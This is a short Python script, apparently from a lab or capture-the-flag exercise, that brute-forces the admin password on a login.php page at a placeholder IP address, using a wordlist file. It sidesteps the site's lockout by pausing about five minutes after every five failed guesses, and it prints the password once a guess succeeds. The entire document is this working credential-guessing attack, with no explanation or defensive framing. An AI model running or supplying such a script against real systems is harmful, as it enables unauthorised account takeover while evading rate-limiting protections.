import requests
import time

counter = 0
url = "http://[IP]/login.php"

with open('passwords.txt', 'r') as file:
    for line in file:
      if counter == 5 :
        block_data = {'username': 'admin','password': 'TRIGGER_BLOCK'}
        r = requests.post(url, data=block_data)
        total_sleep_time = 302
        for remaining_time in range(total_sleep_time, 0, -1):
            print(f"Time left until next attempt: {remaining_time} seconds", end='\r')
            time.sleep(1)
        counter = 0
      password = line.strip()
      data = {'username': 'admin','password': f'{password}'}
      response = requests.post(url, data=data)
      if "The password you entered is not valid." in response.text:
          print(f"[-] admin:{password} ==> Invalid Credentials")
          counter = counter +1
      else:
          print(f"\n\n[+] admin:{password} ==> Valid Credentials!!!\n")
          exit()
